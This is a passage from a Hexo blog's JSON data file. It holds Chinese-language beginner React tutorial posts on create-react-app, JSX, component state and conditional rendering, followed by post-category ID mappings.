<li>一群打杂小弟——生命周期</li>\n</ol>\n<p>\ncreate-React-app是一个全局的命令行工具用来创建一个新的项目\nreact-scripts是一个生成的项目所需要的开发依赖\n</p>\n<p>\n一般我们开始创建react应用程序的时候，要自己通过npm或者安装项目的全部依赖，再写webpack.config.js，一系列复杂的配置，搭建好开发环境后写src源代码\n</p>\n<p>\n现在如果你正在搭建react运行环境，使用create-react-app去自动构建你的程序。你的项目所在的文件夹下是没有配置文件的。react-scripts是唯一的额外的构造依赖\n</p>\n<p>\n在你的package.json中，你的运行环境将有每一个你需要用来构建一个现代应用程序所需要的依赖，在配置文件中编写的配置代码，React脚本都帮你写了，比如：react-scripts帮你自动下载需要的webpack-dev-server依赖，然后react脚本自己写了一个nodejs服务端的脚本代码start.js来实例化.\n</p>\n<p>\nWebpackDevServer，并且运行启动了一个使用express的Http服务器，现在你只需要专心写SRC源代码就可以了。省去了很多精力，最适合快速上手一个演示了。\n</p>\n<h5>React-scripts有以下支持，都帮你配置好了：</h5>\n<p>React，JSX，ES6和Flow语法支持。</p>\n<p>ES6之外的语言扩展像对象扩展运算符。</p>\n<p>直接从JavaScript导入CSS和图像文件。</p>\n<p>自动翻译CSS，所以你不需要-webkit或其他前缀。</p>\n<p>一个构建脚本来捆绑JS，CSS，和图像进行生产，具有源代码图。</p>\n\n<h3>示例:</h3>\n<div>index:</div>\n    // 1.引入两位带头大哥 react和react-dom\n    import React from 'react'\n    import ReactDom from 'react-dom'\n    // 引入App组件 \n    import App from './App'\n    import logo from './logo.svg'\n    // ReactDom负责控制页面的内容 但是使用ReactDom 必须依赖React\n    // 第一个参数 是渲染的元素(必须是闭合标签)  第二个参数是渲染的位置\n    ReactDom.render(\n      //<div>\n        //<h1>今天学习了react</h1>\n        //<h2>这是一个h2标签</h2>\n        //<img src={logo} alt=\"\"/>\n        //<App />\n      //</div>,\n      document.getElementById('root')\n    )\n    // jsx ==== javascript +xml  神秘的卧底\n    // 可以在js语言中 插入 xml(html)语言  语法糖  每一个XML标签都会被JSX转换工具转换成纯Javascript代码\n<div>app:</div>\n    import React,{Component} from 'react'\n    import './App.css'\n    class App extends Component{\n      constructor(){\n        super()\n        console.log(this)\n        this.state = {\n          name:'焦洋',\n          time:(new Date()).toLocaleTimeString()\n        }\n        setInterval(()=>{\n          // 在react中 修改state  不能直接修改 必须通过调用this.setState()\n          // 修改我们的时间\n          // console.log(this);\n          this.setState({\n            time:(new Date()).toLocaleTimeString()\n          })\n        },1000)\n      }\n      say(){\n        return 'say Hello'\n      }\n        \n      // 引入一个打杂的小弟  生命周期 方法\n      render(){\n        // var s = 'abc'\n        // {} 插值 插槽  <%= %> 插值即可以插变量 也可以插函数\n        return (\n          <ul>\n            <li>1</li>\n            <li className='li2'>{3>4 ? '真的' : '假的'}</li>\n            <li>{this.say()}</li>\n            <li>{111}</li>\n            <li>{this.state.name}</li>\n            <li>{this.state.time}</li>\n          </ul>\n          )\n      }\n    }\n    //抛出 App\n    export default App;","source":"_posts/WebFrameWork/React/React-01.md","raw":"---\ntitle: React-入门\ndate: 2017-09-13 15:21:11\ntags: React\narchives: Front-end\ncategories: 前端\n---\n<h2>入门</h2>\n<ol>\n  <li>一个核心思想——组件化</li>\n  <li>两位带头大哥——react & react-dom</li>\n  <li>一个基本运作方式——数据驱动视图</li>\n  <li>一位神秘卧底——jsx语法</li>\n  <li>三位护法——state（状态）、props（属性）、refs（实例）</li>\n  <li>一群打杂小弟——生命周期</li>\n</ol>\n<p>\ncreate-React-app是一个全局的命令行工具用来创建一个新的项目\nreact-scripts是一个生成的项目所需要的开发依赖\n</p>\n<p>\n一般我们开始创建react应用程序的时候，要自己通过npm或者安装项目的全部依赖，再写webpack.config.js，一系列复杂的配置，搭建好开发环境后写src源代码\n</p>\n<p>\n现在如果你正在搭建react运行环境，使用create-react-app去自动构建你的程序。你的项目所在的文件夹下是没有配置文件的。react-scripts是唯一的额外的构造依赖\n</p>\n<p>\n在你的package.json中，你的运行环境将有每一个你需要用来构建一个现代应用程序所需要的依赖，在配置文件中编写的配置代码，React脚本都帮你写了，比如：react-scripts帮你自动下载需要的webpack-dev-server依赖，然后react脚本自己写了一个nodejs服务端的脚本代码start.js来实例化.\n</p>\n<p>\nWebpackDevServer，并且运行启动了一个使用express的Http服务器，现在你只需要专心写SRC源代码就可以了。省去了很多精力，最适合快速上手一个演示了。\n</p>\n<h5>React-scripts有以下支持，都帮你配置好了：</h5>\n<p>React，JSX，ES6和Flow语法支持。</p>\n<p>ES6之外的语言扩展像对象扩展运算符。</p>\n<p>直接从JavaScript导入CSS和图像文件。</p>\n<p>自动翻译CSS，所以你不需要-webkit或其他前缀。</p>\n<p>一个构建脚本来捆绑JS，CSS，和图像进行生产，具有源代码图。</p>\n\n<h3>示例:</h3>\n<div>index:</div>\n    // 1.引入两位带头大哥 react和react-dom\n    import React from 'react'\n    import ReactDom from 'react-dom'\n    // 引入App组件 \n    import App from './App'\n    import logo from './logo.svg'\n    // ReactDom负责控制页面的内容 但是使用ReactDom 必须依赖React\n    // 第一个参数 是渲染的元素(必须是闭合标签)  第二个参数是渲染的位置\n    ReactDom.render(\n      //<div>\n        //<h1>今天学习了react</h1>\n        //<h2>这是一个h2标签</h2>\n        //<img src={logo} alt=\"\"/>\n        //<App />\n      //</div>,\n      document.getElementById('root')\n    )\n    // jsx ==== javascript +xml  神秘的卧底\n    // 可以在js语言中 插入 xml(html)语言  语法糖  每一个XML标签都会被JSX转换工具转换成纯Javascript代码\n<div>app:</div>\n    import React,{Component} from 'react'\n    import './App.css'\n    class App extends Component{\n      constructor(){\n        super()\n        console.log(this)\n        this.state = {\n          name:'焦洋',\n          time:(new Date()).toLocaleTimeString()\n        }\n        setInterval(()=>{\n          // 在react中 修改state  不能直接修改 必须通过调用this.setState()\n          // 修改我们的时间\n          // console.log(this);\n          this.setState({\n            time:(new Date()).toLocaleTimeString()\n          })\n        },1000)\n      }\n      say(){\n        return 'say Hello'\n      }\n        \n      // 引入一个打杂的小弟  生命周期 方法\n      render(){\n        // var s = 'abc'\n        // {} 插值 插槽  <%= %> 插值即可以插变量 也可以插函数\n        return (\n          <ul>\n            <li>1</li>\n            <li className='li2'>{3>4 ? '真的' : '假的'}</li>\n            <li>{this.say()}</li>\n            <li>{111}</li>\n            <li>{this.state.name}</li>\n            <li>{this.state.time}</li>\n          </ul>\n          )\n      }\n    }\n    //抛出 App\n    export default App;","slug":"WebFrameWork/React/React-01","published":1,"updated":"2018-05-09T06:25:33.983Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2dn008gb8xj6njvvmhb","content":"<p></p><h2>入门</h2><p></p>\n<p><ol><br>  <li>一个核心思想——组件化</li><br>  <li>两位带头大哥——react &amp; react-dom</li><br>  <li>一个基本运作方式——数据驱动视图</li><br>  <li>一位神秘卧底——jsx语法</li><br>  <li>三位护法——state（状态）、props（属性）、refs（实例）</li><br>  <li>一群打杂小弟——生命周期</li><br></ol></p>\n<p><br>create-React-app是一个全局的命令行工具用来创建一个新的项目<br>react-scripts是一个生成的项目所需要的开发依赖<br></p><br><p><br>一般我们开始创建react应用程序的时候，要自己通过npm或者安装项目的全部依赖，再写webpack.config.js，一系列复杂的配置，搭建好开发环境后写src源代码<br></p><br><p><br>现在如果你正在搭建react运行环境，使用create-react-app去自动构建你的程序。你的项目所在的文件夹下是没有配置文件的。react-scripts是唯一的额外的构造依赖<br></p><br><p><br>在你的package.json中，你的运行环境将有每一个你需要用来构建一个现代应用程序所需要的依赖，在配置文件中编写的配置代码，React脚本都帮你写了，比如：react-scripts帮你自动下载需要的webpack-dev-server依赖，然后react脚本自己写了一个nodejs服务端的脚本代码start.js来实例化.<br></p><br><p><br>WebpackDevServer，并且运行启动了一个使用express的Http服务器，现在你只需要专心写SRC源代码就可以了。省去了很多精力，最适合快速上手一个演示了。<br></p><br><h5>React-scripts有以下支持，都帮你配置好了：</h5><br><p>React，JSX，ES6和Flow语法支持。</p><br><p>ES6之外的语言扩展像对象扩展运算符。</p><br><p>直接从JavaScript导入CSS和图像文件。</p><br><p>自动翻译CSS，所以你不需要-webkit或其他前缀。</p><br><p>一个构建脚本来捆绑JS，CSS，和图像进行生产，具有源代码图。</p>\n\n<p></p><h3>示例:</h3><p></p>\n<p><div>index:</div><br>    // 1.引入两位带头大哥 react和react-dom<br>    import React from ‘react’<br>    import ReactDom from ‘react-dom’<br>    // 引入App组件<br>    import App from ‘./App’<br>    import logo from ‘./logo.svg’<br>    // ReactDom负责控制页面的内容 但是使用ReactDom 必须依赖React<br>    // 第一个参数 是渲染的元素(必须是闭合标签)  第二个参数是渲染的位置<br>    ReactDom.render(<br>      //<div><br>        //<h1>今天学习了react</h1><br>        //<h2>这是一个h2标签</h2><br>        //<img src=\"{logo}\" alt=\"\"><br>        //<app><br>      //</app></div>,<br>      document.getElementById(‘root’)<br>    )<br>    // jsx ==== javascript +xml  神秘的卧底<br>    // 可以在js语言中 插入 xml(html)语言  语法糖  每一个XML标签都会被JSX转换工具转换成纯Javascript代码</p>\n<p><div>app:</div><br>    import React,{Component} from ‘react’<br>    import ‘./App.css’<br>    class App extends Component{<br>      constructor(){<br>        super()<br>        console.log(this)<br>        this.state = {<br>          name:’焦洋’,<br>          time:(new Date()).toLocaleTimeString()<br>        }<br>        setInterval(()=&gt;{<br>          // 在react中 修改state  不能直接修改 必须通过调用this.setState()<br>          // 修改我们的时间<br>          // console.log(this);<br>          this.setState({<br>            time:(new Date()).toLocaleTimeString()<br>          })<br>        },1000)<br>      }<br>      say(){<br>        return ‘say Hello’<br>      }</p>\n<pre><code>  // 引入一个打杂的小弟  生命周期 方法\n  render(){\n    // var s = &apos;abc&apos;\n    // {} 插值 插槽  &lt;%= %&gt; 插值即可以插变量 也可以插函数\n    return (\n      &lt;ul&gt;\n        &lt;li&gt;1&lt;/li&gt;\n        &lt;li className=&apos;li2&apos;&gt;{3&gt;4 ? &apos;真的&apos; : &apos;假的&apos;}&lt;/li&gt;\n        &lt;li&gt;{this.say()}&lt;/li&gt;\n        &lt;li&gt;{111}&lt;/li&gt;\n        &lt;li&gt;{this.state.name}&lt;/li&gt;\n        &lt;li&gt;{this.state.time}&lt;/li&gt;\n      &lt;/ul&gt;\n      )\n  }\n}\n//抛出 App\nexport default App;\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p></p><h2>入门</h2><p></p>\n<p><ol><br>  <li>一个核心思想——组件化</li><br>  <li>两位带头大哥——react &amp; react-dom</li><br>  <li>一个基本运作方式——数据驱动视图</li><br>  <li>一位神秘卧底——jsx语法</li><br>  <li>三位护法——state（状态）、props（属性）、refs（实例）</li><br>  <li>一群打杂小弟——生命周期</li><br></ol></p>\n<p><br>create-React-app是一个全局的命令行工具用来创建一个新的项目<br>react-scripts是一个生成的项目所需要的开发依赖<br></p><br><p><br>一般我们开始创建react应用程序的时候，要自己通过npm或者安装项目的全部依赖，再写webpack.config.js，一系列复杂的配置，搭建好开发环境后写src源代码<br></p><br><p><br>现在如果你正在搭建react运行环境，使用create-react-app去自动构建你的程序。你的项目所在的文件夹下是没有配置文件的。react-scripts是唯一的额外的构造依赖<br></p><br><p><br>在你的package.json中，你的运行环境将有每一个你需要用来构建一个现代应用程序所需要的依赖，在配置文件中编写的配置代码，React脚本都帮你写了，比如：react-scripts帮你自动下载需要的webpack-dev-server依赖，然后react脚本自己写了一个nodejs服务端的脚本代码start.js来实例化.<br></p><br><p><br>WebpackDevServer，并且运行启动了一个使用express的Http服务器，现在你只需要专心写SRC源代码就可以了。省去了很多精力，最适合快速上手一个演示了。<br></p><br><h5>React-scripts有以下支持，都帮你配置好了：</h5><br><p>React，JSX，ES6和Flow语法支持。</p><br><p>ES6之外的语言扩展像对象扩展运算符。</p><br><p>直接从JavaScript导入CSS和图像文件。</p><br><p>自动翻译CSS，所以你不需要-webkit或其他前缀。</p><br><p>一个构建脚本来捆绑JS，CSS，和图像进行生产，具有源代码图。</p>\n\n<p></p><h3>示例:</h3><p></p>\n<p><div>index:</div><br>    // 1.引入两位带头大哥 react和react-dom<br>    import React from ‘react’<br>    import ReactDom from ‘react-dom’<br>    // 引入App组件<br>    import App from ‘./App’<br>    import logo from ‘./logo.svg’<br>    // ReactDom负责控制页面的内容 但是使用ReactDom 必须依赖React<br>    // 第一个参数 是渲染的元素(必须是闭合标签)  第二个参数是渲染的位置<br>    ReactDom.render(<br>      //<div><br>        //<h1>今天学习了react</h1><br>        //<h2>这是一个h2标签</h2><br>        //<img src=\"{logo}\" alt=\"\"><br>        //<app><br>      //</app></div>,<br>      document.getElementById(‘root’)<br>    )<br>    // jsx ==== javascript +xml  神秘的卧底<br>    // 可以在js语言中 插入 xml(html)语言  语法糖  每一个XML标签都会被JSX转换工具转换成纯Javascript代码</p>\n<p><div>app:</div><br>    import React,{Component} from ‘react’<br>    import ‘./App.css’<br>    class App extends Component{<br>      constructor(){<br>        super()<br>        console.log(this)<br>        this.state = {<br>          name:’焦洋’,<br>          time:(new Date()).toLocaleTimeString()<br>        }<br>        setInterval(()=&gt;{<br>          // 在react中 修改state  不能直接修改 必须通过调用this.setState()<br>          // 修改我们的时间<br>          // console.log(this);<br>          this.setState({<br>            time:(new Date()).toLocaleTimeString()<br>          })<br>        },1000)<br>      }<br>      say(){<br>        return ‘say Hello’<br>      }</p>\n<pre><code>  // 引入一个打杂的小弟  生命周期 方法\n  render(){\n    // var s = &apos;abc&apos;\n    // {} 插值 插槽  &lt;%= %&gt; 插值即可以插变量 也可以插函数\n    return (\n      &lt;ul&gt;\n        &lt;li&gt;1&lt;/li&gt;\n        &lt;li className=&apos;li2&apos;&gt;{3&gt;4 ? &apos;真的&apos; : &apos;假的&apos;}&lt;/li&gt;\n        &lt;li&gt;{this.say()}&lt;/li&gt;\n        &lt;li&gt;{111}&lt;/li&gt;\n        &lt;li&gt;{this.state.name}&lt;/li&gt;\n        &lt;li&gt;{this.state.time}&lt;/li&gt;\n      &lt;/ul&gt;\n      )\n  }\n}\n//抛出 App\nexport default App;\n</code></pre>"},{"title":"React-02","date":"2017-09-14T14:51:40.000Z","archives":"前端","_content":"React作用：提供jsx的语法糖支持和Component的功能\nReactDom作用：渲染虚拟Dom和控制桌面内容\nReactDom.render(){渲染虚拟Dom,Element元素}\n\n核心概念：组件化！\n组件：创建一个构造函数，使用ES6语法。\n````\nclass App extends Component{\n  constructor(){  //（ES6提供方法）\n    和 super()结合使用,来继承Compoent的方法\n    引入护法 state 状态（数据驱动视图）\n    //所有初始化属性都会存放在state\n    this.state={\n      count:0;\n    }\n  }\n  xxx(){//其他自定义事件}\n  '{}'在任何地方都能插值\n  render(){   //（React提供方法）\n    *React插入事件的方法\n    '{}'大括号的用法\n    <button onClick={this.clickHandler}>点我</button>\n  }\n  //React里面function的=>(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this\n  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法\n  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次\n}\n````\n01.19分分析state和生命周期的匹配与使用\n\n小心this的指向！\n\n09-14 02 29分 :\n插值数组\n\n\n","source":"_posts/WebFrameWork/React/React-02.md","raw":"---\ntitle: React-02\ndate: 2017-09-14 22:51:40\ntags: React\narchives: 前端\ncategories: 前端\n---\nReact作用：提供jsx的语法糖支持和Component的功能\nReactDom作用：渲染虚拟Dom和控制桌面内容\nReactDom.render(){渲染虚拟Dom,Element元素}\n\n核心概念：组件化！\n组件：创建一个构造函数，使用ES6语法。\n````\nclass App extends Component{\n  constructor(){  //（ES6提供方法）\n    和 super()结合使用,来继承Compoent的方法\n    引入护法 state 状态（数据驱动视图）\n    //所有初始化属性都会存放在state\n    this.state={\n      count:0;\n    }\n  }\n  xxx(){//其他自定义事件}\n  '{}'在任何地方都能插值\n  render(){   //（React提供方法）\n    *React插入事件的方法\n    '{}'大括号的用法\n    <button onClick={this.clickHandler}>点我</button>\n  }\n  //React里面function的=>(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this\n  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法\n  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次\n}\n````\n01.19分分析state和生命周期的匹配与使用\n\n小心this的指向！\n\n09-14 02 29分 :\n插值数组\n\n\n","slug":"WebFrameWork/React/React-02","published":1,"updated":"2018-05-09T06:25:37.974Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2do008jb8xj71w9v141","content":"<p>React作用：提供jsx的语法糖支持和Component的功能<br>ReactDom作用：渲染虚拟Dom和控制桌面内容<br>ReactDom.render(){渲染虚拟Dom,Element元素}</p>\n<p>核心概念：组件化！<br>组件：创建一个构造函数，使用ES6语法。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class App extends Component&#123;</span><br><span class=\"line\">  constructor()&#123;  //（ES6提供方法）</span><br><span class=\"line\">    和 super()结合使用,来继承Compoent的方法</span><br><span class=\"line\">    引入护法 state 状态（数据驱动视图）</span><br><span class=\"line\">    //所有初始化属性都会存放在state</span><br><span class=\"line\">    this.state=&#123;</span><br><span class=\"line\">      count:0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  xxx()&#123;//其他自定义事件&#125;</span><br><span class=\"line\">  &apos;&#123;&#125;&apos;在任何地方都能插值</span><br><span class=\"line\">  render()&#123;   //（React提供方法）</span><br><span class=\"line\">    *React插入事件的方法</span><br><span class=\"line\">    &apos;&#123;&#125;&apos;大括号的用法</span><br><span class=\"line\">    &lt;button onClick=&#123;this.clickHandler&#125;&gt;点我&lt;/button&gt;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  //React里面function的=&gt;(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this</span><br><span class=\"line\">  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法</span><br><span class=\"line\">  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>01.19分分析state和生命周期的匹配与使用</p>\n<p>小心this的指向！</p>\n<p>09-14 02 29分 :<br>插值数组</p>\n","site":{"data":{}},"excerpt":"","more":"<p>React作用：提供jsx的语法糖支持和Component的功能<br>ReactDom作用：渲染虚拟Dom和控制桌面内容<br>ReactDom.render(){渲染虚拟Dom,Element元素}</p>\n<p>核心概念：组件化！<br>组件：创建一个构造函数，使用ES6语法。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class App extends Component&#123;</span><br><span class=\"line\">  constructor()&#123;  //（ES6提供方法）</span><br><span class=\"line\">    和 super()结合使用,来继承Compoent的方法</span><br><span class=\"line\">    引入护法 state 状态（数据驱动视图）</span><br><span class=\"line\">    //所有初始化属性都会存放在state</span><br><span class=\"line\">    this.state=&#123;</span><br><span class=\"line\">      count:0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  xxx()&#123;//其他自定义事件&#125;</span><br><span class=\"line\">  &apos;&#123;&#125;&apos;在任何地方都能插值</span><br><span class=\"line\">  render()&#123;   //（React提供方法）</span><br><span class=\"line\">    *React插入事件的方法</span><br><span class=\"line\">    &apos;&#123;&#125;&apos;大括号的用法</span><br><span class=\"line\">    &lt;button onClick=&#123;this.clickHandler&#125;&gt;点我&lt;/button&gt;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  //React里面function的=&gt;(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this</span><br><span class=\"line\">  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法</span><br><span class=\"line\">  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>01.19分分析state和生命周期的匹配与使用</p>\n<p>小心this的指向！</p>\n<p>09-14 02 29分 :<br>插值数组</p>\n"},{"title":"react中{if-else}","date":"2018-05-14T02:09:30.000Z","_content":"## \n在react中用jsx渲染dom的时候经常会遇到if条件判断，然而在jsx中竟是不允许if条件判断的。以下有几种判断方式，可以根据自己的应用场景，挑选适合的。\n\n-----------------------------\n\n[阅读原文](https://blog.csdn.net/wmzy1067111110/article/details/51538241)","source":"_posts/WebFrameWork/React/react中{if-else}.md","raw":"---\ntitle: react中{if-else}\ndate: 2018-05-14 10:09:30\ntags: react-if-else\ncategories: react\n---\n## \n在react中用jsx渲染dom的时候经常会遇到if条件判断，然而在jsx中竟是不允许if条件判断的。以下有几种判断方式，可以根据自己的应用场景，挑选适合的。\n\n-----------------------------\n\n[阅读原文](https://blog.csdn.net/wmzy1067111110/article/details/51538241)","slug":"WebFrameWork/React/react中{if-else}","published":1,"updated":"2018-05-14T08:45:12.850Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2dp008mb8xjtdn5l9m5","content":"<p>##<br>在react中用jsx渲染dom的时候经常会遇到if条件判断，然而在jsx中竟是不允许if条件判断的。以下有几种判断方式，可以根据自己的应用场景，挑选适合的。</p>\n<hr>\n<p><a href=\"https://blog.csdn.net/wmzy1067111110/article/details/51538241\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>##<br>在react中用jsx渲染dom的时候经常会遇到if条件判断，然而在jsx中竟是不允许if条件判断的。以下有几种判断方式，可以根据自己的应用场景，挑选适合的。</p>\n<hr>\n<p><a href=\"https://blog.csdn.net/wmzy1067111110/article/details/51538241\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cjj87i26h0000b8xj6jqvudoj","category_id":"cjj87i26p0002b8xjxkrjbfvg","_id":"cjj87i26z000cb8xjx8scv3dk"},{"post_id":"cjj87i26m0001b8xj29o29o69","category_id":"cjj87i26u0007b8xjgae66mak","_id":"cjj87i273000ib8xjw2t74o8o"},{"post_id":"cjj87i26u0006b8xjsiyn070b","category_id":"cjj87i26z000db8xj71t8hr97","_id":"cjj87i279000ob8xjim5tydiw"},{"post_id":"cjj87i26w000ab8xjmvc8zk4f","category_id":"cjj87i274000jb8xjjy9lwbrs","_id":"cjj87i27d000ub8xj6f9ktmwb"},{"post_id":"cjj87i26y000bb8xjgyix6o8a","category_id":"cjj87i279000pb8xjwks5s1sh","_id":"cjj87i27f000zb8xjtg9w9sd7"},{"post_id":"cjj87i270000fb8xj8gnxougc","category_id":"cjj87i27e000wb8xjqwzmyghc","_id":"cjj87i27h0013b8xjjphdm1wl"},{"post_id":"cjj87i272000hb8xje240zghv","category_id":"cjj87i27f0010b8xjrc5qwxhw","_id":"cjj87i27j0017b8xj55rkbb2m"},{"post_id":"cjj87i274000lb8xjnb40qtps","category_id":"cjj87i27h0014b8xjchz825g0","_id":"cjj87i27k001bb8xj4wg8sfe5"},{"post_id":"cjj87i277000nb8xjjz6brqjs","category_id":"cjj87i27j0018b8xjlf6bk6l2","_id":"cjj87i27l001fb8xjs99un8lr"},{"post_id":"cjj87i27a000rb8xjomcq2p2o","category_id":"cjj87i27k001cb8xji6vq26z8","_id":"cjj87i27o001jb8xjo56k50lt"},{"post_id":"cjj87i27c000tb8xj7s5qzkvb","category_id":"cjj87i27m001gb8xj27gnf9af","_id":"cjj87i27p001mb8xjoydqc1xu"},{"post_id":"cjj87i27d000vb8xjkpqw9xx9","category_id":"cjj87i27o001kb8xjvg67wj7j","_id":"cjj87i27q001nb8xjhg21zre6"},{"post_id":"cjj87i299001qb8xjyb72yba4","category_id":"cjj87i29b001sb8xjj8scg05w","_id":"cjj87i29i0022b8xjtlep9i6c"},{"post_id":"cjj87i29a001rb8xj3wkihhox","category_id":"cjj87i29f001xb8xjk2vpqnhe","_id":"cjj87i29o0029b8xjksk57qw3"},{"post_id":"cjj87i29c001ub8xjma7kqx5k","category_id":"cjj87i29b001sb8xjj8scg05w","_id":"cjj87i29r002eb8xj107og4vy"},{"post_id":"cjj87i29d001vb8xj1lal0vfu","category_id":"cjj87i29n0028b8xjgo6tvl5q","_id":"cjj87i29u002kb8xjq49qkeeb"},{"post_id":"cjj87i29r002hb8xj83poa6sp","category_id":"cjj87i26p0002b8xjxkrjbfvg","_id":"cjj87i29w002qb8xj13j6y8rw"},{"post_id":"cjj87i29e001wb8xjmkvh390h","category_id":"cjj87i29r002fb8xjrp3aqbvg","_id":"cjj87i29x002sb8xjhbad46uz"},{"post_id":"cjj87i29g0020b8xjc9hvmast","category_id":"cjj87i29u002lb8xjyzdmwwpy","_id":"cjj87i2a0002yb8xjg8nrfspu"},{"post_id":"cjj87i29h0021b8xjsqkrajg0","category_id":"cjj87i29y002tb8xj0apl03z0","_id":"cjj87i2a30034b8xj1mdokggq"},{"post_id":"cjj87i29k0025b8xjdfb4f233","category_id":"cjj87i2a0002zb8xjqxroqt1y","_id":"cjj87i2a6003bb8xjdcykavko"},{"post_id":"cjj87i29m0027b8xjphwrty08","category_id":"cjj87i2a0002zb8xjqxroqt1y","_id":"cjj87i2a9003hb8xjv6690lzh"},{"post_id":"cjj87i2a7003cb8xjm034mrvw","category_id":"cjj87i27m001gb8xj27gnf9af","_id":"cjj87i2ad003lb8xjzr1gb1nc"},{"post_id":"cjj87i29p002bb8xjxy19mpcv","category_id":"cjj87i2a0002zb8xjqxroqt1y","_id":"cjj87i2af003pb8xjcywq3j6i"},{"post_id":"cjj87i2aa003ib8xjovyw628b","category_id":"cjj87i27m001gb8xj27gnf9af","_id":"cjj87i2ag003sb8xj52j1193t"},{"post_id":"cjj87i29t002jb8xj1i000tlq","category_id":"cjj87i2a9003gb8xjx99hiipu","_id":"cjj87i2ai003wb8xj53oi954j"},{"post_id":"cjj87i2ab003kb8xjb3sptzdd","category_id":"cjj87i27m001gb8xj27gnf9af","_id":"cjj87i2ak003zb8xj2ytrp8w0"},{"post_id":"cjj87i29u002mb8xjdy9f1y1j","category_id":"cjj87i2a9003gb8xjx99hiipu","_id":"cjj87i2am0043b8xjiuv6mtes"},{"post_id":"cjj87i29x002rb8xjudb2wir3","category_id":"cjj87i2a9003gb8xjx99hiipu","_id":"cjj87i2ao0047b8xjkx04n3m0"},{"post_id":"cjj87i29y002vb8xjsv8d9s3e","category_id":"cjj87i2a0002zb8xjqxroqt1y","_id":"cjj87i2aq004bb8xjg896gh87"},{"post_id":"cjj87i2ao0049b8xjtq1eklfh","category_id":"cjj87i29b001sb8xjj8scg05w","_id":"cjj87i2aq004eb8xjwfdalkzl"},{"post_id":"cjj87i2a10031b8xjckg8shfx","category_id":"cjj87i2ao0046b8xjonhrcwhb","_id":"cjj87i2ar004gb8xjv0betd8h"},{"post_id":"cjj87i2a50039b8xjitbwjzy0","category_id":"cjj87i2aq004cb8xj9f97urhg","_id":"cjj87i2as004kb8xj8jzez9nf"},{"post_id":"cjj87i2ae003ob8xjurs58tyo","category_id":"cjj87i2ar004hb8xj33qk5qd5","_id":"cjj87i2at004ob8xjhnyyp1om"},{"post_id":"cjj87i2ag003rb8xjrxx2foto","category_id":"cjj87i2as004lb8xjuv62nbcw","_id":"cjj87i2au004sb8xjppsqsh8a"},{"post_id":"cjj87i2aj003yb8xjonlr6lee","category_id":"cjj87i2at004pb8xju1v9lx2r","_id":"cjj87i2av004wb8xjvq3aauka"},{"post_id":"cjj87i2al0042b8xj1zisyb5c","category_id":"cjj87i2au004tb8xjihzbtub8","_id":"cjj87i2aw0050b8xjjdjddsb0"},{"post_id":"cjj87i2an0044b8xj4tlcektl","category_id":"cjj87i2av004xb8xjlg3nk2ya","_id":"cjj87i2aw0053b8xjie8umajh"},{"post_id":"cjj87i2bg005eb8xj5zcw9jfw","category_id":"cjj87i279000pb8xjwks5s1sh","_id":"cjj87i2bs005jb8xj2wf7a2qd"},{"post_id":"cjj87i2bh005fb8xjg9v4awru","category_id":"cjj87i279000pb8xjwks5s1sh","_id":"cjj87i2bv005lb8xj3hzppqgm"},{"post_id":"cjj87i2bq005hb8xjsptwe7a1","category_id":"cjj87i279000pb8xjwks5s1sh","_id":"cjj87i2bz005qb8xjhyk7abg7"},{"post_id":"cjj87i2bt005kb8xjhqb5qmqt","category_id":"cjj87i279000pb8xjwks5s1sh","_id":"cjj87i2c3005ub8xj1yblflt9"},{"post_